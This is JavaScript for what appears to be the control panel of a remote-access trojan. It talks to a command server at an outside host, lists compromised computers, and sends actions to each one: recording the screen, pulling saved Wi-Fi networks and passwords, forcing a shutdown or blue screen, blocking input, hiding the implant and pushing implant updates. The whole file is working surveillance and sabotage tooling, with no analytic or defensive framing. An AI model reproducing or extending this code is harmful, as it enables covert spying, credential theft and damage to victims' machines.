let computerItems = document.querySelectorAll('.computer-list li');
const computerList = document.querySelector('.computer-list');
const displayArea = document.querySelector('.display-area');
const displayText = document.querySelector('.display-text');
const displayBox = document.querySelector('.display-box');
const options = document.querySelector('.options');
const loader = document.querySelector('.loader');
const logs = document.querySelector('.logs');
const menu = document.querySelector('.menu');
const log = document.querySelector('.log');
let check_session = 'check_session';

let optionsMenu = null
let optionsMenuButton = null
let computerName = '';
let session = ''
let currentTime = '';
let retryNum = 0

const terminal = (function() {
    const terminal = function() {
        log.insertAdjacentHTML('beforeend', `<p class="success">[INIT] Terminal active.`)
        log.scrollTo({
            top: log.scrollHeight,
            behavior: 'smooth'
        })
    };

    terminal.success = function(message, { className: customClass } = {}) {
        log.insertAdjacentHTML('beforeend', `<p class="success${' ' + customClass || ''}">[SUCCESS] ${message}</p>`)
        log.scrollTo({
            top: log.scrollHeight,
            behavior: 'smooth'
        })
    };

    terminal.clear = function() {
        log.innerHTML = ``
        log.scrollIntoView({
            behavior: 'smooth',
            block: 'end'
        });
    };

    terminal.log = function(message, { className: customClass } = {}) {
        log.insertAdjacentHTML('beforeend', `<p ${`class="${customClass}"` || ''}>[LOG] ${message}</p>`)
        log.scrollTo({
            top: log.scrollHeight,
            behavior: 'smooth'
        })
    };

    terminal.warn = function(message, { className: customClass } = {}) {
        log.insertAdjacentHTML('beforeend', `<p class="warn${' ' + customClass || ''}">[WARN] ${message}</p>`)
        log.scrollTo({
            top: log.scrollHeight,
            behavior: 'smooth'
        })
    };

    terminal.error = function(message, { className: customClass } = {}) {
        log.insertAdjacentHTML('beforeend', `<p class="error${' ' + customClass || ''}">[ERR!] ${message}</p>`)
        log.scrollTo({
            top: log.scrollHeight,
            behavior: 'smooth'
        })
    }

    return terminal;
})();

async function POST(payload = {}) {
    const res = await fetch("https://cslckrwbcl.lrdevstudio.com/messages", {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })

    return res.json()
}

async function auth() {
    const sessionid = localStorage.getItem('sessionidfromloginpage')

    if (!sessionid && localStorage.getItem('loggedIn') == null) { location.href = '/'; return }

    const res = await POST({
        check_session: sessionid
    })

    terminal()
    terminal.success('Validated login')
    terminal.warn(`Session expires in loading...`, { className: 'time' });
    startSessionTimer(res.remaining);
    localStorage.setItem('loggedIn', 'true')

    await refreshPCList()

    setTimeout(() => {
        terminal.error('Session expired.')
        localStorage.clear()
        location.href = '/'
    }, res.remaining * 1000)
}

function startSessionTimer(totalSeconds) {
    const timer = document.querySelector('.time');

    totalSeconds = Number(totalSeconds); // force number

    if (isNaN(totalSeconds) || totalSeconds <= 0) {
        timer.innerHTML = `<p class="warn time">[WARN] Session expired</p>`;
        return;
    }

    const interval = setInterval(() => {
        if (totalSeconds <= 0) {
            clearInterval(interval);
            timer.innerHTML = `<p class="warn time">[WARN] Session expired</p>`;
            return;
        }

        const mins = Math.floor(totalSeconds / 60);
        const secs = totalSeconds % 60;

        timer.innerHTML =
            `<p class="warn time">[WARN] Session expires in ${mins}:${String(secs).padStart(2, '0')}</p>`;

        totalSeconds--;
    }, 1000);
}


async function refreshPCList() {
    let all_computers = 'all_computers'
    const computers = await POST({ all_computers })

    if (computers == '') { terminal.warn('No PCs found.'); return }

    computerList.innerHTML = computers
        .map(c => `<li>${c}</li>`)
        .join('')

    computerItems = document.querySelectorAll('.computer-list li')
    terminal.log('Loaded computers.')
}

auth();

setTimeout(() => {
    loader.style.animation = 'fade-out 1s ease-in-out';

    setTimeout(async () => {
        loader.style.display = 'none';
        menu.style.display = 'flex';
        menu.style.animation = 'fade-in 1s ease-in-out';
    }, 1000);

}, 1000);

(async () => {
    function enableMenuButtons() {
        if (!optionsMenu) createOptionsMenu()
        optionsMenuButton = document.querySelectorAll('.options-menu-button')

        optionsMenuButton.forEach(item => {
            if (!item.classList.contains('always-enabled')) {
                item.style.pointerEvents = 'auto'
                item.style.opacity = '1'
                item.classList.remove('disabled')
            }
        })
    }

    function createOptionsMenu() {
        optionsMenu = document.createElement('div')
        optionsMenu.className = 'options-menu'
        optionsMenu.innerHTML = `
            <button class="options-menu-button disabled" data-action="record">Record Screen</button>
            <button class="options-menu-button always-enabled" data-action="clear">Clear Logs</button>
            <button class="options-menu-button always-enabled" data-action="refresh-pcs">Refresh PC list</button>
            <button class="options-menu-button always-enabled" data-action="delete-videos">Delete all stored videos</button>
            <button class="options-menu-button disabled" data-action="jumpscare">Jumpscare</button>
            <button class="options-menu-button disabled" data-action="neautralize">Neautralize</button>
            <button class="options-menu-button disabled" data-action="all-networks">Fetch network and passwords</button>
            <button class="options-menu-button disabled" data-action="shutdown">Shutdown PC</button>
            <button class="options-menu-button disabled" data-action="bsod">BSOD</button>
            <button class="options-menu-button disabled" data-action="flash">Flash PC</button>
            <button class="options-menu-button disabled" data-action="block">Block Inputs</button>
            <button class="options-menu-button disabled" data-action="update">Release Update</button>
        `
        menu.appendChild(optionsMenu)
        optionsMenuButton = document.querySelectorAll('.options-menu-button')
        optionsMenuButton.forEach(item => {
            if (item.classList.contains('disabled')) {
                item.style.pointerEvents = 'none'
                item.style.opacity = '0.4'
            }
        })
    }

    function closeOptionsMenu() {
        if (!optionsMenu) return

        optionsMenu.classList.remove('show')
        options.classList.remove('active')
    }

    options.addEventListener('click', e => {
        e.stopPropagation()
        if (!optionsMenu) createOptionsMenu()

        const rect = options.getBoundingClientRect();

        optionsMenu.style.left = `${rect.right - optionsMenu.offsetWidth}px`;
        optionsMenu.style.top = `${rect.top - optionsMenu.offsetHeight - 6}px`;

        optionsMenu.classList.toggle('show')
        options.classList.toggle('active')
    })

    document.addEventListener('click', e => {
        if (!options.contains(e.target)) {
            closeOptionsMenu()
        }
    })

    document.addEventListener('keydown', e => {
        if (e.key === 'Escape') closeOptionsMenu()
    })

    function openPopup(popup_name, popup_button, input_type, actionCallback) {
        const overlay = document.createElement('div')
        overlay.className = 'popup-overlay'
        
        const popup = document.createElement('div')
        popup.className = 'popup-box'
        popup.innerHTML = `
            <p>${popup_name}</p>
            <input ${input_type === 'number' ? 'type="number" min="1" value="5"' : 'type="text" value=""'} class="popup-input">
            <button>${popup_button}</button>
        `
        
        overlay.appendChild(popup)
        document.body.appendChild(overlay)

        const input = popup.querySelector('.popup-input')
        const button = popup.querySelector('button')

        button.addEventListener('click', async () => {
            const value = input.value
            await actionCallback(value)
            document.body.removeChild(overlay)
        })

        overlay.addEventListener('click', e => {
            if (e.target === overlay) document.body.removeChild(overlay)
        })

        document.addEventListener('keydown', e => {
            if (e.key === 'Escape') document.body.removeChild(overlay)
        }, { once: true })
    }

    document.addEventListener('click', async e => {
        const btn = e.target.closest('.options-menu button')
        if (!btn) return
        const action = btn.dataset.action

        if (action === 'record') {
            openPopup('Recording duration', 'Start Recording', 'number', async (durationValue) => {
                const duration = Number(durationValue)

                const now = new Date()
                const year = now.getFullYear()
                const month = String(now.getMonth() + 1).padStart(2, '0')
                const day = String(now.getDate()).padStart(2, '0')
                const hours = String(now.getHours()).padStart(2, '0')
                const minutes = String(now.getMinutes()).padStart(2, '0')
                const currentTime = `${year}-${month}-${day}_${hours}-${minutes}`

                terminal.log(`POSTED: record-${computerName}-${currentTime} (${duration}s)`)

                const res = await POST({
                    action: `record-${computerName}`,
                    time: currentTime,
                    duration: duration
                })

                listenFor({
                    match: 'screen-recording-ready',
                    maxRetries: 10,

                    onMatch: () => {
                        terminal.success("Video ready, rendering")

                        let videoArea = ''
                        if (!displayBox) videoArea = document.querySelector('.screen-rec')
                        if (displayBox) videoArea = displayBox
                        
                        videoArea.outerHTML = `
                            <video class='screen-rec' controls autoplay muted>
                                <source src="/fetch_recording/${computerName}/${currentTime}" type="video/mp4">
                            </video>`;
                    },

                    onFail: () => {
                        terminal.error('Recording not fetched, target offline?')
                        displayText.innerHTML = 'No Display'
                    }
                })
            })
        } else if (action === 'clear') { 
            terminal.clear()
        } else if (action === 'refresh-pcs') {
            refreshPCList()
        } else if (action === 'delete-videos') {
            const res = await fetch(`${window.location.origin}/delete-videos`)
            terminal.success('Deleted all videos (local, endpoint, client)') 
        } else if (action === 'jumpscare') {
            openPopup('Window amount', 'Send request', 'number',  async (value) => { 
                await POST({
                    action: `jumpscare-${computerName}`,
                    data: value
                })

                terminal.success(`Jumpscared ${computerName}`)
            })
        } else if (action === 'neautralize') {
            await POST({
                action: `hidewbcl-${computerName}`
            })

            terminal.success(`Neautralized ${computerName}`)
        
        } else if (action === 'all-networks') {
            await POST({
                action: `network-passwords-${computerName}`
            })

            terminal.log(`Fetching all networks and passwords for ${computerName}`)
            listenFor({
                match: `all-network-passwords-${computerName}`,
                maxRetries: 10,

                onMatch: (message) => {
                    terminal.success("Networks and passwords found");

                    const parsed = JSON.parse(message);
                    const key = `all-network-passwords-${computerName}`;
                    const networks = parsed[key] || [];

                    const table = document.createElement('table');
                    table.innerHTML = `
                        <thead>
                            <tr>
                                <th>Network</th>
                                <th>Password</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${networks.map(([ssid, password]) => `
                                <tr>
                                    <td>${ssid}</td>
                                    <td>${password}</td>
                                </tr>
                            `).join('')}
                        </tbody>
                    `;

                    const container = document.createElement('div');
                    container.className = 'networks-container'
                    container.appendChild(table);

                    let networksArea = displayBox || document.querySelector('.screen-rec');
                    networksArea.innerHTML = '';
                    networksArea.appendChild(container);
                },


                onFail: () => {
                    terminal.error('Request not fetched, target offline?')
                }
            })
        } else if (action === 'shutdown') {
            await POST({
                action: `shutdown-${computerName}`
            }) 
            terminal.success(`Shutdown signal to ${computerName} sent.`)
        } else if (action === 'bsod') { 
            await POST({
                action: `bsod-${computerName}`
            }) 
            terminal.success(`BSOD to ${computerName} sent.`)
        } else if (action === 'flash')  {
            await POST({
                action: `flash-${computerName}`
            }) 
            terminal.success(`Flashing signal to ${computerName} sent.`)
        } else if (action === 'block') { 
            await POST({
                action: `blockinput-${computerName}`
            }) 
            terminal.success(`Blocked inputs for ${computerName}.`)
        } else if (action === 'update') {
            await POST({
                action: `updatewbcl-${computerName}`
            }) 
            terminal.success(`Update released for ${computerName}.`)
        }
    })

    computerItems = document.querySelectorAll('.computer-list li')

    computerList.addEventListener('click', e => {
        const item = e.target.closest('li')
        if (!item) return

        if (computerName === item.textContent.trim()) return

        document.querySelectorAll('.computer-list li')
            .forEach(li => li.classList.remove('active'))

        item.classList.add('active')
        computerName = item.textContent.trim()

        enableMenuButtons()

        terminal.log(`Selected computer: ${computerName}`)
    })

})();


async function listenFor({ match, interval = 3000, maxRetries = 5, onMatch, onFail }) {
    let retries = 0

    async function poll() {
        const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages')
        const text = await res.text()
        
        if (!text || text.trim() == '[]') {
            return setTimeout(poll, interval)
        }

        let parsed = JSON.parse(text.replace(/\n/g, ''))
        let wrongFetchWarn = document.querySelector('.wrong-fetch')
        if (wrongFetchWarn) {
            wrongFetchWarn.innerHTML = `[WARN] Wrong fetch, refunding post (${retries})`
        }
        const message = JSON.stringify(Array.isArray(parsed) ? parsed[0] : parsed)

        if (!message.includes(match)) {
            if (wrongFetchWarn) {
                wrongFetchWarn.innerHTML = `[WARN] Wrong fetch, refunding post (${retries})`
            } else terminal.warn('Wrong fetch, refunding post', { className : 'wrong-fetch'})
            await POST(JSON.parse(message))
            return retry()
        }

        onMatch(message)
    }

    function retry() {
        retries++
        if (retries >= maxRetries) {
            if (onFail) onFail()
            return
        }
        setTimeout(poll, interval)
    }

    poll()
}